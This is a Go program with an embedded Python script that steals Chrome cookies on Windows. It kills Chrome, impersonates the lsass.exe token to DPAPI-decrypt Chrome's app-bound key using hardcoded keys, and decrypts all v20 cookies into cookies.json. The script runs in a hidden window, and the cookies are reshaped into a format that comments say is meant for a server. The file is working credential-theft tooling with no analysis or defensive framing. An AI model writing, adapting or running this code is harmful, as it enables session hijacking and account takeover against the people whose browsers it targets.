package main

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"syscall"
)

type InputCookie struct {
	HostKey string `json:"host_key"`
	Name    string `json:"name"`
	Value   string `json:"value"`
}

// TransformedCookie 是我们发送给服务器的最终结构
type TransformedCookie struct {
	Domain string `json:"domain"`
	Name   string `json:"name"`
	Value  string `json:"value"`
}

// pythonScript 存储了需要执行的完整Python代码
// 注意：Go的原始字符串字面量 (`) 不需要对特殊字符进行转义
const pythonScript = `
import os
import io
import sys
import json
import struct
import ctypes
import sqlite3
import pathlib
import binascii
from contextlib import contextmanager


try:
    import windows
    import windows.security
    import windows.crypto
    import windows.generated_def as gdef
    from Crypto.Cipher import AES, ChaCha20_Poly1305
except ImportError as e:
    print(f"导入错误: {e}")
    print("请确保已安装所有必需的库，例如 'pycryptodome' 和 'pywin32'。")
    print("对于 'windows' 库，请确保您已正确安装。")
    sys.exit(1)



@contextmanager
def impersonate_lsass():
    original_token = windows.current_thread.token
    try:
        windows.current_process.token.enable_privilege("SeDebugPrivilege")
        proc = next(p for p in windows.system.processes if p.name == "lsass.exe")
        lsass_token = proc.token
        impersonation_token = lsass_token.duplicate(
            type=gdef.TokenImpersonation,
            impersonation_level=gdef.SecurityImpersonation
        )
        windows.current_thread.token = impersonation_token
        yield
    finally:
        windows.current_thread.token = original_token

def parse_key_blob(blob_data: bytes) -> dict:
    buffer = io.BytesIO(blob_data)
    parsed_data = {}

    header_len = struct.unpack('<I', buffer.read(4))[0]
    parsed_data['header'] = buffer.read(header_len)
    content_len = struct.unpack('<I', buffer.read(4))[0]
    assert header_len + content_len + 8 == len(blob_data)

    parsed_data['flag'] = buffer.read(1)[0]

    if parsed_data['flag'] == 1 or parsed_data['flag'] == 2:
        parsed_data['iv'] = buffer.read(12)
        parsed_data['ciphertext'] = buffer.read(32)
        parsed_data['tag'] = buffer.read(16)
    elif parsed_data['flag'] == 3:
        parsed_data['encrypted_aes_key'] = buffer.read(32)
        parsed_data['iv'] = buffer.read(12)
        parsed_data['ciphertext'] = buffer.read(32)
        parsed_data['tag'] = buffer.read(16)
    else:
        raise ValueError(f"Unsupported flag: {parsed_data['flag']}")

    return parsed_data

def decrypt_with_cng(input_data):
    ncrypt = ctypes.windll.NCRYPT
    hProvider = gdef.NCRYPT_PROV_HANDLE()
    provider_name = "Microsoft Software Key Storage Provider"
    status = ncrypt.NCryptOpenStorageProvider(ctypes.byref(hProvider), provider_name, 0)
    assert status == 0, f"NCryptOpenStorageProvider failed with status {status}"

    hKey = gdef.NCRYPT_KEY_HANDLE()
    key_name = "Google Chromekey1"
    status = ncrypt.NCryptOpenKey(hProvider, ctypes.byref(hKey), key_name, 0, 0)
    assert status == 0, f"NCryptOpenKey failed with status {status}"

    pcbResult = gdef.DWORD(0)
    input_buffer = (ctypes.c_ubyte * len(input_data)).from_buffer_copy(input_data)

    status = ncrypt.NCryptDecrypt(
        hKey, input_buffer, len(input_buffer), None, None, 0,
        ctypes.byref(pcbResult), 0x40  # NCRYPT_SILENT_FLAG
    )
    assert status == 0, f"1st NCryptDecrypt failed with status {status}"

    buffer_size = pcbResult.value
    output_buffer = (ctypes.c_ubyte * pcbResult.value)()

    status = ncrypt.NCryptDecrypt(
        hKey, input_buffer, len(input_buffer), None, output_buffer, buffer_size,
        ctypes.byref(pcbResult), 0x40  # NCRYPT_SILENT_FLAG
    )
    assert status == 0, f"2nd NCryptDecrypt failed with status {status}"

    ncrypt.NCryptFreeObject(hKey)
    ncrypt.NCryptFreeObject(hProvider)

    return bytes(output_buffer[:pcbResult.value])

def byte_xor(ba1, ba2):
    return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])

def derive_v20_master_key(parsed_data: dict) -> bytes:
    if parsed_data['flag'] == 1:
        aes_key = bytes.fromhex("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
        cipher = AES.new(aes_key, AES.MODE_GCM, nonce=parsed_data['iv'])
    elif parsed_data['flag'] == 2:
        chacha20_key = bytes.fromhex("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660")
        cipher = ChaCha20_Poly1305.new(key=chacha20_key, nonce=parsed_data['iv'])
    elif parsed_data['flag'] == 3:
        xor_key = bytes.fromhex("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390")
        with impersonate_lsass():
            decrypted_aes_key = decrypt_with_cng(parsed_data['encrypted_aes_key'])
        xored_aes_key = byte_xor(decrypted_aes_key, xor_key)
        cipher = AES.new(xored_aes_key, AES.MODE_GCM, nonce=parsed_data['iv'])
    else:
        raise ValueError(f"Unsupported or unknown flag for master key derivation: {parsed_data['flag']}")

    return cipher.decrypt_and_verify(parsed_data['ciphertext'], parsed_data['tag'])

def main():
    try:
        os.system("taskkill /F /IM chrome.exe /T > nul 2>&1")
    except Exception as e:
        pass

    user_profile = os.environ['USERPROFILE']
    local_state_path = rf"{user_profile}\AppData\Local\Google\Chrome\User Data\Local State"
    cookie_db_path = rf"{user_profile}\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies"

    if not os.path.exists(local_state_path) or not os.path.exists(cookie_db_path):
        return

    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)

    app_bound_encrypted_key = local_state["os_crypt"]["app_bound_encrypted_key"]
    assert(binascii.a2b_base64(app_bound_encrypted_key)[:4] == b"APPB")
    key_blob_encrypted = binascii.a2b_base64(app_bound_encrypted_key)[4:]

    with impersonate_lsass():
        key_blob_system_decrypted = windows.crypto.dpapi.unprotect(key_blob_encrypted)

    key_blob_user_decrypted = windows.crypto.dpapi.unprotect(key_blob_system_decrypted)

    parsed_data = parse_key_blob(key_blob_user_decrypted)
    v20_master_key = derive_v20_master_key(parsed_data)

    con = sqlite3.connect(pathlib.Path(cookie_db_path).as_uri() + "?mode=ro", uri=True)
    cur = con.cursor()
    r = cur.execute("SELECT host_key, name, CAST(encrypted_value AS BLOB) from cookies;")
    cookies = cur.fetchall()
    con.close()

    cookies_v20 = [c for c in cookies if c[2][:3] == b"v20"]

    def decrypt_cookie_v20(encrypted_value):
        try:
            cookie_iv = encrypted_value[3:3+12]
            encrypted_cookie = encrypted_value[3+12:-16]
            cookie_tag = encrypted_value[-16:]
            cookie_cipher = AES.new(v20_master_key, AES.MODE_GCM, nonce=cookie_iv)
            decrypted_cookie = cookie_cipher.decrypt_and_verify(encrypted_cookie, cookie_tag)
            return decrypted_cookie[32:].decode('utf-8', errors='ignore')
        except Exception:
            pass

    exported_cookies = []
    for c in cookies_v20:
        host_key, name, encrypted_value = c
        decrypted_value = decrypt_cookie_v20(encrypted_value)
        cookie_data = {
            "host_key": host_key,
            "name": name,
            "value": decrypted_value
        }
        exported_cookies.append(cookie_data)

    output_filename = "cookies.json"
    with open(output_filename, "w", encoding="utf-8") as f:
        json.dump(exported_cookies, f, indent=4, ensure_ascii=False)



if __name__ == "__main__":
        main()
`

func OutJson() {
	// 1. 检查是否为管理员权限
	if !isAdmin() {
		fmt.Println("错误：此程序需要以管理员权限运行。")
		fmt.Println("请右键单击编译后的 .exe 文件，然后选择“以管理员身份运行”。")
		return
	}

	// 2. 安装Python依赖库 (此步骤保持可见，以便用户确认依赖安装情况)
	fmt.Println("--- 步骤 1: 正在检查并安装Python依赖库 (如果需要) ---")
	cmd := exec.Command("pip", "install", "pywin32", "PythonForWindows", "pycryptodome", "-i", "https://pypi.tuna.tsinghua.edu.cn/simple")
	cmd.Stdout = os.Stdout // 将命令的标准输出连接到当前程序的标准输出
	cmd.Stderr = os.Stderr // 将命令的标准错误连接到当前程序的标准错误

	err := cmd.Run()
	if err != nil {
		log.Panicf("安装Python依赖失败: %v\n请确保您的系统中已安装Python和pip，并已将其添加到系统PATH环境变量中。", err)
	}
	fmt.Println("依赖库安装成功！")

	// 3. 将内嵌的Python脚本写入临时文件
	fmt.Println("\n--- 步骤 2: 正在准备并静默执行解密脚本 ---")
	tmpfile, err := ioutil.TempFile("", "go_chrome_decrypt_*.py")
	if err != nil {
		log.Panicf("创建临时脚本文件失败: %v", err)
	}
	defer os.Remove(tmpfile.Name())

	if _, err := tmpfile.Write([]byte(pythonScript)); err != nil {
		log.Panicf("写入脚本到临时文件失败: %v", err)
	}
	if err := tmpfile.Close(); err != nil {
		log.Panicf("关闭临时文件失败: %v", err)
	}

	// 4. 在隐藏的窗口中执行Python脚本
	fmt.Printf("正在后台静默执行解密脚本...\n")
	pyCmd := exec.Command("python", tmpfile.Name())

	// --- 核心修改部分：设置在隐藏窗口中运行 ---
	// 此设置仅在 Windows 上有效和必要
	if runtime.GOOS == "windows" {
		pyCmd.SysProcAttr = &syscall.SysProcAttr{
			HideWindow:    true,
			CreationFlags: 0x08000000, // CREATE_NO_WINDOW
		}
	}

	// 由于是静默执行，我们不再将子进程的输出打印到主控制台
	// pyCmd.Stdout = os.Stdout
	// pyCmd.Stderr = os.Stderr

	err = pyCmd.Run()
	if err != nil {
		// 脚本执行失败，但由于是静默运行，我们只在主程序中提示错误
		fmt.Printf("\nPython 脚本在后台执行时遇到错误: %v\n", err)
		fmt.Println("这可能是因为找不到Chrome路径、权限不足或解密失败。")
	} else {
		// 检查文件是否存在来确认成功
		if _, err := os.Stat("cookies.json"); err == nil {
			fmt.Println("\n任务完成！后台脚本执行成功，'cookies.json' 文件已生成在当前目录。")
		} else {
			fmt.Println("\n后台脚本已执行，但未找到 'cookies.json' 文件。可能在执行过程中发生了内部错误。")
		}
	}
}

// convertCookiesJSON 读取并转换 cookies.json 文件
// 它将原始的 JSON 结构转换为服务器期望的格式，并返回 []byte
func ConvertCookiesJSON() ([]byte, error) {
	// 1. 读取 cookies.json 文件
	fileBytes, err := os.ReadFile("cookies.json")
	if err != nil {
		// 将错误传递给调用者处理
		return nil, fmt.Errorf("读取 cookies.json 文件失败: %w", err)
	}

	// 2. 解析 JSON 到 InputCookie 结构体切片
	var cookies []InputCookie
	if err := json.Unmarshal(fileBytes, &cookies); err != nil {
		return nil, fmt.Errorf("解析 cookies.json 失败: %w", err)
	}

	// 3. 转换结构：将 host_key 映射到 domain
	transformedCookies := make([]TransformedCookie, len(cookies))
	for i, cookie := range cookies {
		transformedCookies[i] = TransformedCookie{
			Domain: cookie.HostKey,
			Name:   cookie.Name,
			Value:  cookie.Value,
		}
	}

	// 4. 将转换后的数据重新编码为 JSON
	outputBytes, err := json.Marshal(transformedCookies)
	if err != nil {
		return nil, fmt.Errorf("编码转换后的 cookie 数据失败: %w", err)
	}

	return outputBytes, nil
}

// isAdmin 检查当前用户是否具有管理员权限
func isAdmin() bool {
	_, err := os.Open("\\\\.\\PHYSICALDRIVE0")
	// 在Windows上，尝试打开物理驱动器0是检查管理员权限的常用方法。
	// 如果没有管理员权限，此操作会因权限不足而失败。
	if err != nil && strings.Contains(err.Error(), "Access is denied") {
		return false
	}
	// 如果错误是其他类型（例如，在没有物理驱动器的系统上），我们假设权限检查通过或不适用。
	// 如果没有错误，则表示有权限。
	return true
}

// 备用isAdmin函数（更可靠，但需要Windows特定构建）
// 如果上面的简单检查不工作，可以使用这个更健壮的版本。
// 需要在文件顶部添加 //go:build windows
/*
import "golang.org/x/sys/windows"

func isAdmin() bool {
	var sid *windows.SID
	// 虽然代码很长，但这是检查管理员组（BUILTIN\Administrators）的标准方法。
	err := windows.AllocateAndInitializeSid(
		&windows.SECURITY_NT_AUTHORITY,
		2,
		windows.SECURITY_BUILTIN_DOMAIN_RID,
		windows.DOMAIN_ALIAS_RID_ADMINS,
		0, 0, 0, 0, 0, 0,
		&sid)
	if err != nil {
		log.Fatalf("SID 分配失败: %v", err)
	}
	defer windows.FreeSid(sid)

	token := windows.Token(0)
	member, err := token.IsMember(sid)
	if err != nil {
		log.Fatalf("Token IsMember 检查失败: %v", err)
	}
	return member
}
*/
